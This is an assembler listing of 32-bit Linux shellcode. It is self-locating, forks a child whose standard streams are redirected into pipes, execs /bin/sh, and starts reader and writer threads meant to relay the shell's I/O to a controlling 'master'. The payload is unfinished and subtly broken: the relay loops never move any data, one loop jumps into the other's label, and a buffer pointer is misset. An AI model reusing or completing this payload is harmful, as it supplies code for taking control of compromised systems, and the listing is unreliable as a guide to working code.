     1                                  BITS 32
     2                                  
     3                                  ;		     #   1   2   3   4   5   6
     4                                  ; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
     5                                  ; syscall return: EAX
     6                                  
     7                                  start:
     8 00000000 E800000000              	call near shcode_start
     9                                  shcode_start:
    10 00000005 5D                      	pop	ebp
    11 00000006 81ED[05000000]          	sub	ebp, shcode_start
    12 0000000C 81C5[BF010000]          	add	ebp, data_start
    13                                  
    14                                  	; pipe(m2sh)
    15 00000012 B82A000000              	mov	eax,42
    16 00000017 89EB                    	mov	ebx,ebp
    17 00000019 81C315000000            	add	ebx,m2sh_0
    18 0000001F CD80                    	int	0x80
    19                                  
    20 00000021 3D00000000              	cmp	eax,0
    21 00000026 7526                    	jne	child_dead_interleaved
    22                                  
    23                                  	; pipe(sh2m)
    24 00000028 B82A000000              	mov	eax,42
    25 0000002D 89EB                    	mov	ebx,ebp
    26 0000002F 81C31D000000            	add	ebx,sh2m_0
    27 00000035 CD80                    	int	0x80
    28                                  
    29 00000037 3D00000000              	cmp	eax,0
    30 0000003C 7510                    	jne	child_dead_interleaved
    31                                  
    32                                  	; fork()
    33 0000003E B802000000              	mov	eax,2
    34 00000043 CD80                    	int	0x80
    35                                  
    36 00000045 3D00000000              	cmp	eax,0
    37 0000004A 7407                    	je	child
    38 0000004C 7F6B                    	jg	parent			; signed compare
    39                                  child_dead_interleaved:
    40 0000004E E933010000              	jmp	child_dead
    41                                  
    42                                  child:
    43                                  	; dup2(m2sh[0], 0)   (dup to stdin)
    44 00000053 B83F000000              	mov	eax,63
    45 00000058 89EB                    	mov	ebx,ebp
    46 0000005A 81C315000000            	add	ebx,m2sh_0
    47 00000060 8B1B                    	mov	ebx, [ebx]
    48 00000062 31C9                    	xor	ecx,ecx
    49 00000064 CD80                    	int	0x80
    50                                  
    51 00000066 39C8                    	cmp	eax,ecx
    52 00000068 754A                    	jne	leave_sh_interleaved
    53                                  
    54                                  	; dup2(sh2m[1], 1)   (dup to stdout)
    55 0000006A B83F000000              	mov	eax,63
    56 0000006F 89EB                    	mov	ebx,ebp
    57 00000071 81C321000000            	add	ebx,sh2m_1
    58 00000077 8B1B                    	mov	ebx, [ebx]
    59 00000079 41                      	inc	ecx
    60 0000007A CD80                    	int	0x80
    61                                  
    62 0000007C 39C8                    	cmp	eax,ecx
    63 0000007E 7534                    	jne	leave_sh_interleaved
    64                                  	
    65                                  	; dup2(sh2m[1], 2)   (dup to stderr)
    66 00000080 B83F000000              	mov	eax,63
    67 00000085 89EB                    	mov	ebx,ebp
    68 00000087 81C321000000            	add	ebx,sh2m_1
    69 0000008D 8B1B                    	mov	ebx, [ebx]
    70 0000008F 41                      	inc	ecx
    71 00000090 CD80                    	int	0x80
    72                                  
    73 00000092 39C8                    	cmp	eax,ecx
    74 00000094 751E                    	jne	leave_sh_interleaved
    75                                  
    76                                  	; execve("/bin/sh", ["/bin/sh"], NULL)
    77 00000096 B80B000000              	mov	eax,11
    78 0000009B 89EB                    	mov	ebx,ebp
    79 0000009D 81C3[C8010000]          	add	ebx,execve_command
    80 000000A3 89E9                    	mov	ecx,ebp
    81 000000A5 81C125020000            	add	ecx,foo
    82 000000AB 31D2                    	xor	edx,edx
    83 000000AD 8919                    	mov	[ecx],ebx
    84 000000AF 895104                  	mov	[ecx+4],edx
    85 000000B2 CD80                    	int	0x80
    86                                  
    87                                  	; fail if execve did not work.
    88                                  leave_sh_interleaved:
    89 000000B4 E9FF000000              	jmp	leave_sh
    90                                  
    91                                  parent:
    92                                  	; remember child's PID
    93 000000B9 89EB                    	mov	ebx,ebp
    94 000000BB 81C311000000            	add	ebx,child_pid
    95 000000C1 8903                    	mov	[ebx],eax
    96                                  
    97                                  	; close(m2sh[0])
    98 000000C3 B806000000              	mov	eax,6
    99 000000C8 89EB                    	mov	ebx,ebp
   100 000000CA 81C315000000            	add	ebx,m2sh_0
   101 000000D0 CD80                    	int	0x80
   102                                  
   103                                  	; close(sh2m[1])
   104 000000D2 B806000000              	mov	eax,6
   105 000000D7 89EB                    	mov	ebx,ebp
   106 000000D9 81C321000000            	add	ebx,sh2m_1
   107 000000DF CD80                    	int	0x80
   108                                  
   109                                  	; clone:
   110                                  	; one thread for reader, one thread for writer
   111 000000E1 B878000000              	mov	eax,120
   112                                  	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
   113                                  	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
   114 000000E6 BB000F0100              	mov	ebx,0x00010f00
   115 000000EB 89E1                    	mov	ecx,esp	; just use same stack. we don't need the stack, anyway.
   116 000000ED 31D2                    	xor	edx,edx
   117 000000EF CD80                    	int	0x80
   118                                  
   119 000000F1 3D00000000              	cmp	eax,0
   120                                  	; ret=0 -> clone
   121 000000F6 7466                    	je	thread_write_to_master	; clone is writer
   122                                  	; ret>0 -> original
   123 000000F8 7F05                    	jg	thread_read_from_master	; original is reader
   124                                  	; error if ret<0
   125 000000FA E987000000              	jmp	child_dead
   126                                  
   127                                  	; ==================================== the READER thread:
   128                                  thread_read_from_master:
   129                                  	; will write to child via m2sh[1]
   130                                  	; remember RINGBUFFER from_master in esi
   131 000000FF 89EE                    	mov	esi,ebp
   132 00000101 81C625000000            	add	esi,rfrm_buffer
   133                                  
   134                                  reader_while_fds_ok:
   135                                  	; while both FDs are ok:
   136 00000107 8A8503000000            	mov	al,[ebp+to_child_ok]
   137 0000010D 028504000000            	add	al,[ebp+from_child_ok]
   138 00000113 3C02                    	cmp	al,2
   139 00000115 7542                    	jne	leave_sh_second_interleaved
   140                                  
   141                                  	; test, if master requested child to be terminated
   142 00000117 89EB                    	mov	ebx,ebp
   143 00000119 81C302000000            	add	ebx,terminate_child
   144 0000011F 8A03                    	mov	al,[ebx]
   145 00000121 3C00                    	cmp	al,0
   146 00000123 7410                    	je	do_terminate_child
   147                                  
   148                                  	; if ringbuffer is empty, do nothing.
   149 00000125 8B8505000000            	mov	eax,[ebp+rfrm_writer_pos]
   150 0000012B 2B8506000000            	sub	eax,[ebp+rfrm_reader_pos]
   151 00000131 7400                    	jz	reader_sleep
   152                                  
   153                                  
   154                                  
   155                                  
   156                                  reader_sleep:
   157                                  	; sleep some time...
   158                                  
   159 00000133 EBD2                    	jmp	reader_while_fds_ok
   160                                  
   161                                  do_terminate_child:
   162                                  	; send a SIGKILL to child
   163 00000135 B825000000              	mov	eax,37
   164 0000013A 89EB                    	mov	ebx,ebp
   165 0000013C 81C311000000            	add	ebx,child_pid
   166 00000142 8B1B                    	mov	ebx,[ebx]
   167 00000144 B909000000              	mov	ecx,9	; SIGKILL
   168 00000149 CD80                    	int	0x80
   169                                  
   170                                  	; clear to_child_ok
   171 0000014B 31C0                    	xor	eax,eax
   172 0000014D 898503000000            	mov	[ebp+to_child_ok], eax
   173                                  	; and from_child_ok
   174 00000153 898504000000            	mov	[ebp+from_child_ok], eax
   175                                  leave_sh_second_interleaved:
   176 00000159 E95A000000              	jmp	leave_sh
   177                                  
   178                                  	; ==================================== the WRITER thread:
   179                                  thread_write_to_master:
   180                                  	; will read from child via sh2m[0]
   181                                  	; remember RINGBUFFER to_master in esi
   182 0000015E 89EE                    	mov	esi,ebp
   183 00000160 81C607000000            	add	esi,rto_writer_pos
   184                                  
   185                                  writer_while_fds_ok:
   186                                  	; while both FDs are ok:
   187 00000166 8A8503000000            	mov	al,[ebp+to_child_ok]
   188 0000016C 028504000000            	add	al,[ebp+from_child_ok]
   189 00000172 3C02                    	cmp	al,2
   190 00000174 7510                    	jne	child_dead
   191                                  
   192                                  	; if ringbuffer is empty, do nothing.
   193 00000176 8B8507000000            	mov	eax,[ebp+rto_writer_pos]
   194 0000017C 2B8508000000            	sub	eax,[ebp+rto_reader_pos]
   195 00000182 74AF                    	jz	reader_sleep
   196                                  
   197                                  
   198                                  
   199                                  
   200                                  writer_sleep:
   201                                  	; sleep some time...
   202                                  
   203 00000184 EBE0                    	jmp	writer_while_fds_ok
   204                                  
   205                                  	; ==================================================================
   206                                  
   207                                  child_dead:
   208                                  	; at most wait 2 seconds for master's ACK
   209 00000186 31C0                    	xor	eax,eax
   210 00000188 388501000000            	cmp	[ebp+child_is_dead_ACK], al
   211 0000018E 7528                    	jne	leave_sh
   212 00000190 B002                    	mov	al,2
   213 00000192 388500000000            	cmp	[ebp+child_is_dead], al
   214 00000198 771E                    	ja	leave_sh
   215                                  
   216 0000019A FE4500                  	inc byte [ebp]
   217                                  
   218                                  	; usleep(1,0):
   219 0000019D B8A2000000              	mov	eax, 162
   220 000001A2 89EB                    	mov	ebx, ebp
   221 000001A4 81C325020000            	add	ebx, foo
   222 000001AA 89D9                    	mov	ecx, ebx
   223 000001AC 31D2                    	xor	edx,edx
   224 000001AE 895304                  	mov long [ebx+4], edx		; nanoseconds
   225 000001B1 42                      	inc	edx
   226 000001B2 8913                    	mov long [ebx], edx		; seconds
   227 000001B4 CD80                    	int	0x80
   228                                  
   229 000001B6 EBCE                    	jmp	child_dead
   230                                  
   231                                  leave_sh:
   232                                  	; exit-point for BOTH parent:writer&reader and child in case of fail
   233 000001B8 31DB                    	xor	ebx,ebx
   234 000001BA 89D8                    	mov	eax,ebx
   235 000001BC 40                      	inc	eax
   236 000001BD CD80                    	int	0x80
   237                                  
   238                                  ; =============================================================================
   239                                  ; DATA
   240                                  data_start EQU $
   241                                  
   242                                  ; do not change order of the following stuff!
   243                                  
   244                                  child_is_dead EQU $ - data_start
   245 000001BF 00                      	db		0
   246                                  child_is_dead_ACK EQU $ - data_start
   247 000001C0 00                      	db		0
   248                                  
   249                                  terminate_child	EQU $ - data_start
   250 000001C1 00                      	db		0
   251                                  
   252                                  to_child_ok EQU $ - data_start
   253 000001C2 01                      	db		1
   254                                  from_child_ok EQU $ - data_start
   255 000001C3 01                      	db		1
   256                                  
   257                                  ; ringbuffer from_master:
   258                                  
   259                                  rfrm_writer_pos EQU $ - data_start
   260 000001C4 00                      	db		0
   261                                  rfrm_reader_pos EQU $ - data_start
   262 000001C5 00                      	db		0
   263                                  
   264                                  ; ringbuffer to_master:
   265                                  
   266                                  rto_writer_pos EQU $ - data_start
   267 000001C6 00                      	db		0
   268                                  rto_reader_pos EQU $ - data_start
   269 000001C7 00                      	db		0
   270                                  
   271 000001C8 2F62696E2F736800        execve_command	db	'/bin/sh',0
   272                                  
   273                                  ; =============================================================================
   274                                  ; stuff that is not required to be initialized:
   275                                  align 4
   276                                  
   277                                  child_pid EQU $ - data_start
   278                                  
   279                                  ; pipes middleman<->shell
   280                                  m2sh_0 EQU $ - data_start + 4			; shell reads
   281                                  m2sh_1 EQU $ - data_start + 8			; master writes
   282                                  sh2m_0 EQU $ - data_start + 12			; master reads
   283                                  sh2m_1 EQU $ - data_start + 16			; shell writes
   284                                  
   285                                  rfrm_buffer EQU $ - data_start + 20		; FROM master
   286                                  rto_buffer EQU $ - data_start + 276		; TO master
   287                                  
   288                                  foo EQU $ - data_start + 532
   289                                  bar EQU $ - data_start + 536
   290                                  baz EQU $ - data_start + 540
   291                                  qux EQU $ - data_start + 544
   292                                  
